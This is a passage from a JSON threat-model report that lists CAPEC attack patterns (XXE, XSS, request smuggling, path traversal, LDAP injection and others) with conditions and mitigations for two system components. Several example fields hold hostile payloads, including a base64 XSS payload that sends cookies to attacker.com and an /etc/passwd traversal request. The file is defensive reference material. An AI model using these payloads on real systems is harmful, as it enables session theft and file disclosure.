benefits and eliminates some client-server round-tripping. However, the web server cannot assume that the requests it receives have been subject to those validations, because an attacker can use an alternate method for crafting the HTTP Request and submit data that contains poisoned values designed to spoof a user and/or get the web server to disclose information.Web 2.0 style applications may be particularly vulnerable because they in large part rely on existing infrastructure which provides scalability without the ability to govern the clients. Attackers identify vulnerabilities that either assume the client side is responsible for some security services (without the requisite ability to ensure enforcement of these checks) and/or the lack of a hardened, default deny server configuration that allows for an attacker probing for weaknesses in unexpected ways. Client side validation, request formatting and other services may be performed, but these are strictly usability enhancements not security enhancements.Many web applications use client side scripting like JavaScript to enforce authentication, authorization, session state and other variables, but at the end of day they all make requests to the server. These client side checks may provide usability and performance gains, but they lack integrity in terms of the http request. It is possible for an attacker to post variables directly to the server without using any of the client script security checks and customize the patterns to impersonate other users or probe for more information.Many message oriented middleware systems like MQ Series are rely on information that is passed along with the message request for making authorization decisions, for example what group or role the request should be passed. However, if the message server does not or cannot authenticate the authorization information in the request then the server's policy decisions about authorization are trivial to subvert because the client process can simply elevate privilege by passing in elevated group or role information which the message server accepts and acts on.", "id": "205", "mitigations": "Design: Ensure that client process and/or message is authenticated so that anonymous communications and/or messages are not accepted by the system.Design: Do not rely on client validation or encoding for security purposes.Design: Utilize digital signatures to increase authentication assurance.Design: Utilize two factor authentication to increase authentication assurance.Implementation: Perform input validation for all remote content.", "references": "https://capec.mitre.org/data/definitions/22.html, http://cwe.mitre.org/data/definitions/287.html", "response": "", "severity": "High", "target": "Browser Control Server", "threat_id": "AA04"}, {"assumption": null, "condition": "target.usesXMLParser is False or target.controls.disablesDTD is False", "cvss": "", "description": "XML External Entities Blowup", "details": "This attack takes advantage of the entity replacement property of XML where the value of the replacement is a URI. A well-crafted XML document could have the entity refer to a URI that consumes a large amount of resources to create a denial of service condition. This can cause the system to either freeze, crash, or execute arbitrary code depending on the URI.", "example": "In this example, the XML parser parses the attacker's XML and opens the malicious URI where the attacker controls the server and writes a massive amount of data to the response stream. In this example the malicious URI is a large file transfer. <?xml version=1.0?>< !DOCTYPE bomb [<!ENTITY detonate SYSTEM http://www.malicious-badguy.com/myhugefile.exe>]><bomb>&detonate;</bomb>", "id": "206", "mitigations": "This attack may be mitigated by tweaking the XML parser to not resolve external entities. If external entities are needed, then implement a custom XmlResolver that has a request timeout, data retrieval limit, and restrict resources it can retrieve locally.", "references": "https://capec.mitre.org/data/definitions/221.html, http://cwe.mitre.org/data/definitions/611.html", "response": "", "severity": "Medium", "target": "Browser Control Server", "threat_id": "INP19"}, {"assumption": null, "condition": "target.controls.usesStrongSessionIdentifiers is False", "cvss": "", "description": "Session Credential Falsification through Manipulation", "details": "An attacker manipulates an existing credential in order to gain access to a target application. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. An attacker may be able to manipulate a credential sniffed from an existing connection in order to gain access to a target server. For example, a credential in the form of a web cookie might have a field that indicates the access rights of a user. By manually tweaking this cookie, a user might be able to increase their access rights to the server. Alternately an attacker may be able to manipulate an existing credential to appear as a different user. This attack differs from falsification through prediction in that the user bases their modified credentials off existing credentials instead of using patterns detected in prior credentials to create a new credential that is accepted because it fits the pattern. As a result, an attacker may be able to impersonate other users or elevate their permissions to a targeted service.", "example": "An adversary uses client side scripting(JavaScript) to set session ID in the victim's browser using document.cookie. This fixates a falsified session credential into victim's browser with the help of a crafted URL link. Once the victim clicks on the link, the attacker is able to bypass authentication or piggyback off some other authenticated victim's session.", "id": "207", "mitigations": "Implementation: Use session IDs that are difficult to guess or brute-force: One way for the attackers to obtain valid session IDs is by brute-forcing or guessing them. By choosing session identifiers that are sufficiently random, brute-forcing or guessing becomes very difficult. Implementation: Regenerate and destroy session identifiers when there is a change in the level of privilege: This ensures that even though a potential victim may have followed a link with a fixated identifier, a new one is issued when the level of privilege changes.", "references": "https://capec.mitre.org/data/definitions/226.html, http://cwe.mitre.org/data/definitions/565.html, http://cwe.mitre.org/data/definitions/472.html", "response": "", "severity": "Medium", "target": "Browser Control Server", "threat_id": "AC11"}, {"assumption": null, "condition": "target.usesXMLParser is False or target.controls.disablesDTD is False", "cvss": "", "description": "DTD Injection", "details": "An attacker injects malicious content into an application's DTD in an attempt to produce a negative technical impact. DTDs are used to describe how XML documents are processed. Certain malformed DTDs (for example, those with excessive entity expansion as described in CAPEC 197) can cause the XML parsers that process the DTDs to consume excessive resources resulting in resource depletion.", "example": "Adversary injects XML External Entity (XEE) attack that can cause the disclosure of confidential information, execute abitrary code, create a Denial of Service of the targeted server, or several other malicious impacts.", "id": "208", "mitigations": "Design: Sanitize incoming DTDs to prevent excessive expansion or other actions that could result in impacts like resource depletion.Implementation: Disallow the inclusion of DTDs as part of incoming messages.Implementation: Use XML parsing tools that protect against DTD attacks.", "references": "https://capec.mitre.org/data/definitions/228.html, http://cwe.mitre.org/data/definitions/829.html", "response": "", "severity": "Medium", "target": "Browser Control Server", "threat_id": "INP21"}, {"assumption": null, "condition": "target.usesXMLParser is False or target.controls.disablesDTD is False", "cvss": "", "description": "XML Attribute Blowup", "details": "This attack exploits certain XML parsers which manage data in an inefficient manner. The attacker crafts an XML document with many attributes in the same XML node. In a vulnerable parser, this results in a denial of service condition owhere CPU resources are exhausted because of the parsing algorithm.", "example": "In this example, assume that the victim is running a vulnerable parser such as .NET framework 1.0. This results in a quadratic runtime of O(n^2). <?xml version=1.0?><fooaaa=ZZZ=...999=/> A document with n attributes results in (n^2)/2 operations to be performed. If an operation takes 100 nanoseconds then a document with 100,000 operations would take 500s to process. In this fashion a small message of less than 1MB causes a denial of service condition on the CPU resources.", "id": "209", "mitigations": "This attack may be mitigated completely by using a parser that is not using a vulnerable container. Mitigation may also limit the number of attributes per XML element.", "references": "https://capec.mitre.org/data/definitions/229.html, http://cwe.mitre.org/data/definitions/770.html", "response": "", "severity": "High", "target": "Browser Control Server", "threat_id": "INP22"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "XSS Targeting URI Placeholders", "details": "An attack of this type exploits the ability of most browsers to interpret data, javascript or other URI schemes as client-side executable content placeholders. This attack consists of passing a malicious URI in an anchor tag HREF attribute or any other similar attributes in other HTML tags. Such malicious URI contains, for example, a base64 encoded HTML content with an embedded cross-site scripting payload. The attack is executed when the browser interprets the malicious content i.e., for example, when the victim clicks on the malicious link.", "example": "The following payload data: text/html;base64,PGh0bWw+PGJvZHk+PHNjcmlwdD52YXIgaW1nID0gbmV3IEltYWdlKCk7IGltZy5zcmMgPSAiaHR0cDovL2F0dGFja2VyLmNvbS9jb29raWVncmFiYmVyPyIrIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWVzKTs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg== represents a base64 encoded HTML and uses the data URI scheme to deliver it to the browser. The decoded payload is the following piece of HTML code: <html><body><script>var img = new Image();img.src = http://attacker.com/cookiegrabber?+ encodeURIComponent(document.cookies); </script> </body> </html> Web applications that take user controlled inputs and reflect them in URI HTML placeholder without a proper validation are at risk for such an attack. An attacker could inject the previous payload that would be placed in a URI placeholder (for example in the anchor tag HREF attribute): <a href=INJECTION_POINT>My Link</a> Once the victim clicks on the link, the browser will decode and execute the content from the payload. This will result on the execution of the cross-site scripting attack.", "id": "210", "mitigations": "Design: Use browser technologies that do not allow client side scripting.Design: Utilize strict type, character, and encoding enforcement.Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Perform output validation for all remote content.Implementation: Disable scripting languages such as JavaScript in browserImplementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.", "references": "https://capec.mitre.org/data/definitions/244.html, http://cwe.mitre.org/data/definitions/83.html", "response": "", "severity": "High", "target": "Browser Control Server", "threat_id": "INP28"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "XSS Using Doubled Characters", "details": "The attacker bypasses input validation by using doubled characters in order to perform a cross-site scripting attack. Some filters fail to recognize dangerous sequences if they are preceded by repeated characters. For example, by doubling the < before a script command, (<<script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the attacker can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.", "example": "By doubling the < before a script command, (<<script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the attacker can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.", "id": "211", "mitigations": "Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and sanitize all user supplied fields.Implementation: The victim should configure the browser to minimize active content from untrusted sources.", "references": "https://capec.mitre.org/data/definitions/245.html", "response": "", "severity": "Medium", "target": "Browser Control Server", "threat_id": "INP29"}, {"assumption": null, "condition": "target.controls.checksInputBounds is False", "cvss": "", "description": "SOAP Array Overflow", "details": "An attacker sends a SOAP request with an array whose actual length exceeds the length indicated in the request. When a data structure including a SOAP array is instantiated, the sender transmits the size of the array as an explicit parameter along with the data. If the server processing the transmission naively trusts the specified size, then an attacker can intentionally understate the size of the array, possibly resulting in a buffer overflow if the server attempts to read the entire data set into the memory it allocated for a smaller array. This, in turn, can lead to a server crash or even the execution of arbitrary code.", "example": "Refer to this example - http://projects.webappsec.org/w/page/13246962/SOAP%20Array%20Abuse", "id": "212", "mitigations": "If the server either verifies the correctness of the stated array size or if the server stops processing an array once the stated number of elements have been read, regardless of the actual array size, then this attack will fail. The former detects the malformed SOAP message while the latter ensures that the server does not attempt to load more data than was allocated for.", "references": "https://capec.mitre.org/data/definitions/256.html", "response": "", "severity": "High", "target": "Browser Control Server", "threat_id": "INP34"}, {"assumption": null, "condition": "target.controls.implementsStrictHTTPValidation is False and target.controls.encodesHeaders is False", "cvss": "", "description": "HTTP Response Smuggling", "details": "An attacker injects content into a server response that is interpreted differently by intermediaries than it is by the target browser. To do this, it takes advantage of inconsistent or incorrect interpretations of the HTTP protocol by various applications. For example, it might use different block terminating characters (CR or LF alone), adding duplicate header fields that browsers interpret as belonging to separate responses, or other techniques. Consequences of this attack can include response-splitting, cross-site scripting, apparent defacement of targeted sites, cache poisoning, or similar actions.", "example": "The attacker targets the cache service used by the organization to reduce load on the internet bandwidth. This server can be a cache server on the LAN or other application server caching the static WebPages. The attacker sends three different HTTP request as shown - Request 1: POST request for http://www.netbanking.com, Request 2: GET request for http:www.netbanking.com/FD.html, Request 3: GET request for http://www.netbanking.com/FD-Rates.html. Due to malformed request cache server assumes request 1 and 3 as valid request and forwards the entire request to the webserver. Webserver which strictly follow then HTTP parsing rule responds with the http://www.netbanking.com/FD.html  HTML page. This is happened because webserver consider request 1 and 2 as valid one. Cache server stores this response against the request 3. When normal users request for page http://www.netbanking.com/FD-Rates.html, cache server responds with the page http://www.netbanking.com/FD.html.Hence attacker will succeeds in cache poisoning.", "id": "213", "mitigations": "Design: Employ strict adherence to interpretations of HTTP messages wherever possible.Implementation: Encode header information provided by user input so that user-supplied content is not interpreted by intermediaries.", "references": "https://capec.mitre.org/data/definitions/273.html", "response": "", "severity": "Medium", "target": "Browser Control Server", "threat_id": "INP36"}, {"assumption": null, "condition": "target.controls.implementsStrictHTTPValidation is False and target.controls.encodesHeaders is False", "cvss": "", "description": "HTTP Request Smuggling", "details": "HTTP Request Smuggling results from the discrepancies in parsing HTTP requests between HTTP entities such as web caching proxies or application firewalls. Entities such as web servers, web caching proxies, application firewalls or simple proxies often parse HTTP requests in slightly different ways. Under specific situations where there are two or more such entities in the path of the HTTP request, a specially crafted request is seen by two attacked entities as two different sets of requests. This allows certain requests to be smuggled through to a second entity without the first one realizing it.", "example": "When using Sun Java System Web Proxy Server 3.x or 4.x in conjunction with Sun ONE/iPlanet 6.x, Sun Java System Application Server 7.x or 8.x, it is possible to bypass certain application firewall protections, hijack web sessions, perform Cross Site Scripting or poison the web proxy cache using HTTP Request Smuggling. Differences in the way HTTP requests are parsed by the Proxy Server and the Application Server enable malicious requests to be smuggled through to the Application Server, thereby exposing the Application Server to aforementioned attacks. See also: CVE-2006-6276Apache server 2.0.45 and version before 1.3.34, when used as a proxy, easily lead to web cache poisoning and bypassing of application firewall restrictions because of non-standard HTTP behavior. Although the HTTP/1.1 specification clearly states that a request with both Content-Length and a Transfer-Encoding: chunked headers is invalid, vulnerable versions of Apache accept such requests and reassemble the ones with Transfer-Encoding: chunked header without replacing the existing Content-Length header or adding its own. This leads to HTTP Request Smuggling using a request with a chunked body and a header with Content-Length: 0. See also: CVE-2005-2088", "id": "214", "mitigations": "HTTP Request Smuggling is usually targeted at web servers. Therefore, in such cases, careful analysis of the entities must occur during system design prior to deployment. If there are known differences in the way the entities parse HTTP requests, the choice of entities needs consideration.Employing an application firewall can help. However, there are instances of the firewalls being susceptible to HTTP Request Smuggling as well.", "references": "https://capec.mitre.org/data/definitions/33.html", "response": "", "severity": "High", "target": "Browser Control Server", "threat_id": "INP37"}, {"assumption": null, "condition": "target.controls.usesStrongSessionIdentifiers is False", "cvss": "", "description": "Session Credential Falsification through Prediction", "details": "This attack targets predictable session ID in order to gain privileges. The attacker can predict the session ID used during a transaction to perform spoofing and session hijacking.", "example": "Jetty before 4.2.27, 5.1 before 5.1.12, 6.0 before 6.0.2, and 6.1 before 6.1.0pre3 generates predictable session identifiers using java.util.random, which makes it easier for remote attackers to guess a session identifier through brute force attacks, bypass authentication requirements, and possibly conduct cross-site request forgery attacks. See also: CVE-2006-6969mod_usertrack in Apache 1.3.11 through 1.3.20 generates session ID's using predictable information including host IP address, system time and server process ID, which allows local users to obtain session ID's and bypass authentication when these session ID's are used for authentication. See also: CVE-2001-1534", "id": "215", "mitigations": "Use a strong source of randomness to generate a session ID.Use adequate length session IDs. Do not use information available to the user in order to generate session ID (e.g., time).Ideas for creating random numbers are offered by Eastlake [RFC1750]. Encrypt the session ID if you expose it to the user. For instance session ID can be stored in a cookie in encrypted format.", "references": "https://capec.mitre.org/data/definitions/59.html", "response": "", "severity": "High", "target": "Browser Control Server", "threat_id": "AC16"}, {"assumption": null, "condition": "target.controls.usesStrongSessionIdentifiers is False", "cvss": "", "description": "Session Hijacking - ServerSide", "details": "This type of attack involves an adversary that exploits weaknesses in an application's use of sessions in performing authentication. The advarsary is able to steal or manipulate an active session and use it to gain unathorized access to the application.", "example": "Cross Site Injection Attack is a great example of Session Hijacking. Attacker can capture victim\u2019s Session ID using XSS attack by using javascript. If an attacker sends a crafted link to the victim with the malicious JavaScript, when the victim clicks on the link, the JavaScript will run and complete the instructions made by the attacker.", "id": "216", "mitigations": "Properly encrypt and sign identity tokens in transit, and use industry standard session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf. Utilize a session timeout for all sessions. If the user does not explicitly logout, terminate their session after this period of inactivity. If the user logs back in then a new session key should be generated.", "references": "https://capec.mitre.org/data/definitions/593.html", "response": "", "severity": "Very High", "target": "Browser Control Server", "threat_id": "AC17"}, {"assumption": null, "condition": "target.controls.sanitizesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "Server Side Include (SSI) Injection", "details": "An attacker can use Server Side Include (SSI) Injection to send code to a web application that then gets executed by the web server. Doing so enables the attacker to achieve similar results to Cross Site Scripting, viz., arbitrary code execution and information disclosure, albeit on a more limited scale, since the SSI directives are nowhere near as powerful as a full-fledged scripting language. Nonetheless, the attacker can conveniently gain access to sensitive files, such as password files, and execute shell commands.", "example": "Consider a website hosted on a server that permits Server Side Includes (SSI), such as Apache with the Options Includes directive enabled. Whenever an error occurs, the HTTP Headers along with the entire request are logged, which can then be displayed on a page that allows review of such errors. A malicious user can inject SSI directives in the HTTP Headers of a request designed to create an error. When these logs are eventually reviewed, the server parses the SSI directives and executes them.", "id": "217", "mitigations": "Set the OPTIONS IncludesNOEXEC in the global access.conf file or local .htaccess (Apache) file to deny SSI execution in directories that do not need them. All user controllable input must be appropriately sanitized before use in the application. This includes omitting, or encoding, certain characters or strings that have the potential of being interpreted as part of an SSI directive. Server Side Includes must be enabled only if there is a strong business reason to do so. Every additional component enabled on the web server increases the attack surface as well as administrative overhead.", "references": "https://capec.mitre.org/data/definitions/101.html, http://cwe.mitre.org/data/definitions/97.html, http://cwe.mitre.org/data/definitions/74.html, http://cwe.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/713.html", "response": "", "severity": "High", "target": "Node Host Agent", "threat_id": "INP03"}, {"assumption": null, "condition": "target.controls.validatesInput is False", "cvss": "", "description": "Command Line Execution through SQL Injection", "details": "An attacker uses standard SQL injection methods to inject data into the command line for execution. This could be done directly through misuse of directives such as MSSQL_xp_cmdshell or indirectly through injection of data into the database that would be interpreted as shell commands. Sometime later, an unscrupulous backend application (or could be part of the functionality of the same application) fetches the injected data stored in the database and uses this data as command line arguments without performing proper validation. The malicious data escapes that data plane by spawning new commands to be executed on the host.", "example": "SQL injection vulnerability in Cacti 0.8.6i and earlier, when register_argc_argv is enabled, allows remote attackers to execute arbitrary SQL commands via the (1) second or (2) third arguments to cmd.php. NOTE: this issue can be leveraged to execute arbitrary commands since the SQL query results are later used in the polling_items array and popen function", "id": "218", "mitigations": "Disable MSSQL xp_cmdshell directive on the databaseProperly validate the data (syntactically and semantically) before writing it to the database. Do not implicitly trust the data stored in the database. Re-validate it prior to usage to make sure that it is safe to use in a given context (e.g. as a command line argument).", "references": "https://capec.mitre.org/data/definitions/108.html, http://cwe.mitre.org/data/definitions/89.html, http://cwe.mitre.org/data/definitions/74.html, http://cwe.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/78.html, http://cwe.mitre.org/data/definitions/114.html", "response": "", "severity": "Very High", "target": "Node Host Agent", "threat_id": "INP05"}, {"assumption": null, "condition": "target.controls.authenticatesSource is False", "cvss": "", "description": "Authentication Abuse/ByPass", "details": "An attacker obtains unauthorized access to an application, service or device either through knowledge of the inherent weaknesses of an authentication mechanism, or by exploiting a flaw in the authentication scheme's implementation. In such an attack an authentication mechanism is functioning but a carefully controlled sequence of events causes the mechanism to grant access to the attacker. This attack may exploit assumptions made by the target's authentication procedures, such as assumptions regarding trust relationships or assumptions regarding the generation of secret values. This attack differs from Authentication Bypass attacks in that Authentication Abuse allows the attacker to be certified as a valid user through illegitimate means, while Authentication Bypass allows the user to access protected material without ever being certified as an authenticated user. This attack does not rely on prior sessions established by successfully authenticating users, as relied upon for the Exploitation of Session Variables, Resource IDs and other Trusted Credentials attack patterns.", "example": "An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.", "id": "219", "mitigations": "Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.", "references": "https://capec.mitre.org/data/definitions/114.html, http://cwe.mitre.org/data/definitions/287.html", "response": "", "severity": "Medium", "target": "Node Host Agent", "threat_id": "AA01"}, {"assumption": null, "condition": "(target.controls.sanitizesInput is False or target.controls.validatesInput is False) or target.controls.encodesOutput is False", "cvss": "", "description": "Excavation", "details": "An adversary actively probes the target in a manner that is designed to solicit information that could be leveraged for malicious purposes. This is achieved by exploring the target via ordinary interactions for the purpose of gathering intelligence about the target, or by sending data that is syntactically invalid or non-standard in an attempt to produce a response that contains the desired data. As a result of these interactions, the adversary is able to obtain information from the target that aids the attacker in making inferences about its security, configuration, or potential vulnerabilities. Examplar exchanges with the target may trigger unhandled exceptions or verbose error messages that reveal information like stack traces, configuration information, path information, or database design. This type of attack also includes the manipulation of query strings in a URI to produce invalid SQL queries, or by trying alternative path values in the hope that the server will return useful information.", "example": "The adversary may collect this information through a variety of methods including active querying as well as passive observation. By exploiting weaknesses in the design or configuration of the target and its communications, an adversary is able to get the target to reveal more information than intended. Information retrieved may aid the adversary in making inferences about potential weaknesses, vulnerabilities, or techniques that assist the adversary's objectives. This information may include details regarding the configuration or capabilities of the target, clues as to the timing or nature of activities, or otherwise sensitive information. Often this sort of attack is undertaken in preparation for some other type of attack, although the collection of information by itself may in some cases be the end goal of the adversary.", "id": "220", "mitigations": "Minimize error/response output to only what is necessary for functional use or corrective language. Remove potentially sensitive information that is not necessary for the application's functionality.", "references": "https://capec.mitre.org/data/definitions/116.html, http://cwe.mitre.org/data/definitions/200.html", "response": "", "severity": "Medium", "target": "Node Host Agent", "threat_id": "DS01"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Double Encoding", "details": "The adversary utilizes a repeating of the encoding process for a set of characters (that is, character encoding a character encoding of a character) to obfuscate the payload of a particular request. This may allow the adversary to bypass filters that attempt to detect illegal characters or strings, such as those that might be used in traversal or injection attacks. Filters may be able to catch illegal encoded strings, but may not catch doubly encoded strings. For example, a dot (.), often used in path traversal attacks and therefore often blocked by filters, could be URL encoded as %2E. However, many filters recognize this encoding and would still block the request. In a double encoding, the % in the above URL encoding would be encoded again as %25, resulting in %252E which some filters might not catch, but which could still be interpreted as a dot (.) by interpreters on the target.", "example": "Double Enconding Attacks can often be used to bypass Cross Site Scripting (XSS) detection and execute XSS attacks. The use of double encouding prevents the filter from working as intended and allows the XSS to bypass dectection. This can allow an adversary to execute malicious code.", "id": "221", "mitigations": "Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input. Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. When client input is required from web-based forms, avoid using the GET method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the POST method whenever possible. Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.Refer to the RFCs to safely decode URL. Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive. There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).", "references": "https://capec.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/173.html, http://cwe.mitre.org/data/definitions/177.html", "response": "", "severity": "Medium", "target": "Node Host Agent", "threat_id": "DE02"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False or target.controls.authorizesSource is False", "cvss": "", "description": "Privilege Abuse", "details": "An adversary is able to exploit features of the target that should be reserved for privileged users or administrators but are exposed to use by lower or non-privileged accounts. Access to sensitive information and functionality must be controlled to ensure that only authorized users are able to access these resources. If access control mechanisms are absent or misconfigured, a user may be able to access resources that are intended only for higher level users. An adversary may be able to exploit this to utilize a less trusted account to gain information and perform activities reserved for more trusted accounts. This attack differs from privilege escalation and other privilege stealing attacks in that the adversary never actually escalates their privileges but instead is able to use a lesser degree of privilege to access resources that should be (but are not) reserved for higher privilege accounts. Likewise, the adversary does not exploit trust or subvert systems - all control functionality is working as configured but the configuration does not adequately protect sensitive resources at an appropriate level.", "example": "An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.", "id": "222", "mitigations": "Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.", "references": "https://capec.mitre.org/data/definitions/122.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/269.html", "response": "", "severity": "Medium", "target": "Node Host Agent", "threat_id": "AC01"}, {"assumption": null, "condition": "target.controls.handlesResourceConsumption is False or target.controls.isResilient is False", "cvss": "", "description": "Flooding", "details": "An adversary consumes the resources of a target by rapidly engaging in a large number of interactions with the target. This type of attack generally exposes a weakness in rate limiting or flow. When successful this attack prevents legitimate users from accessing the service and can cause the target to crash. This attack differs from resource depletion through leaks or allocations in that the latter attacks do not rely on the volume of requests made to the target but instead focus on manipulation of the target's operations. The key factor in a flooding attack is the number of requests the adversary can make in a given period of time. The greater this number, the more likely an attack is to succeed against a given target.", "example": "Adversary tries to bring a network or service down by flooding it with large amounts of traffic.", "id": "223", "mitigations": "Ensure that protocols have specific limits of scale configured. Specify expectations for capabilities and dictate which behaviors are acceptable when resource allocation reaches limits. Uniformly throttle all requests in order to make it more difficult to consume resources more quickly than they can again be freed.", "references": "https://capec.mitre.org/data/definitions/125.html, http://cwe.mitre.org/data/definitions/404.html, http://cwe.mitre.org/data/definitions/770.html", "response": "", "severity": "Medium", "target": "Node Host Agent", "threat_id": "DO01"}, {"assumption": null, "condition": "target.controls.validatesInput is False and target.controls.sanitizesInput is False", "cvss": "", "description": "Path Traversal", "details": "An adversary uses path manipulation methods to exploit insufficient input validation of a target to obtain access to data that should be not be retrievable by ordinary well-formed requests. A typical variety of this attack involves specifying a path to a desired file together with dot-dot-slash characters, resulting in the file access API or function traversing out of the intended directory structure and into the root file system. By replacing or modifying the expected path information the access function or API retrieves the file desired by the attacker. These attacks either involve the attacker providing a complete path to a targeted file or using control characters (e.g. path separators (/ or ) and/or dots (.)) to reach desired directories or files.", "example": "An example of using path traversal to attack some set of resources on a web server is to use a standard HTTP request http://example/../../../../../etc/passwd From an attacker point of view, this may be sufficient to gain access to the password file on a poorly protected system. If the attacker can list directories of critical resources then read only access is not sufficient to protect the system.", "id": "224", "mitigations": "Design: Configure the access control correctly. Design: Enforce principle of least privilege. Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution. Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement. Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host. 6. Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands. Implementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin. Implementation: Perform input validation for all remote content, including remote and user-generated content. Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables. Implementation: Use indirect references rather than actual file names. Implementation: Use possible permissions on file access when developing and deploying web applications. Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- whitelisting approach.", "references": "https://capec.mitre.org/data/definitions/126.html, http://cwe.mitre.org/data/definitions/22.html", "response": "", "severity": "Very High", "target": "Node Host Agent", "threat_id": "HA01"}, {"assumption": null, "condition": "target.controls.handlesResourceConsumption is False", "cvss": "", "description": "Excessive Allocation", "details": "An adversary causes the target to allocate excessive resources to servicing the attackers' request, thereby reducing the resources available for legitimate services and degrading or denying services. Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request.", "example": "In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.", "id": "225", "mitigations": "Limit the amount of resources that are accessible to unprivileged users. Assume all input is malicious. Consider all potentially relevant properties when validating input. Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed. Use resource-limiting settings, if possible.", "references": "https://capec.mitre.org/data/definitions/130.html, http://cwe.mitre.org/data/definitions/770.html, http://cwe.mitre.org/data/definitions/404.html", "response": "", "severity": "Medium", "target": "Node Host Agent", "threat_id": "DO02"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Format String Injection", "details": "An adversary includes formatting characters in a string input field on the target application. Most applications assume that users will provide static text and may respond unpredictably to the presence of formatting character. For example, in certain functions of the C programming languages such as printf, the formatting character %s will print the contents of a memory location expecting this location to identify a string and the formatting character %n prints the number of DWORD written in the memory. An adversary can use this to read or write to memory locations or files, or simply to manipulate the value of the resulting text in unexpected ways. Reading or writing memory may result in program crashes and writing memory could result in the execution of arbitrary code if the adversary can write to the program stack.", "example": "Untrusted search path vulnerability in the add_filename_to_string function in intl/gettext/loadmsgcat.c for Elinks 0.11.1 allows local users to cause Elinks to use an untrusted gettext message catalog (.po file) in a ../po directory, which can be leveraged to conduct format string attacks.", "id": "226", "mitigations": "Limit the usage of formatting string functions. Strong input validation - All user-controllable input must be validated and filtered for illegal formatting characters.", "references": "https://capec.mitre.org/data/definitions/135.html, http://cwe.mitre.org/data/definitions/134.html, http://cwe.mitre.org/data/definitions/133.html", "response": "", "severity": "High", "target": "Node Host Agent", "threat_id": "INP08"}, {"assumption": null, "condition": "target.controls.validatesInput is False", "cvss": "", "description": "LDAP Injection", "details": "An attacker manipulates or crafts an LDAP query for the purpose of undermining the security of the target. Some applications use user input to create LDAP queries that are processed by an LDAP server. For example, a user might provide their username during authentication and the username might be inserted in an LDAP query during the authentication process. An attacker could use this input to inject additional commands into an LDAP query that could disclose sensitive information. For example, entering a * in the aforementioned query might return information about all users on the system. This attack is very similar to an SQL injection attack in that it manipulates a query to gather additional information or coerce a particular return value.", "example": "PowerDNS before 2.9.18, when running with an LDAP backend, does not properly escape LDAP queries, which allows remote attackers to cause a denial of service (failure to answer ldap questions) and possibly conduct an LDAP injection attack.", "id": "227", "mitigations": "Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as LDAP content. Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the LDAP or application.", 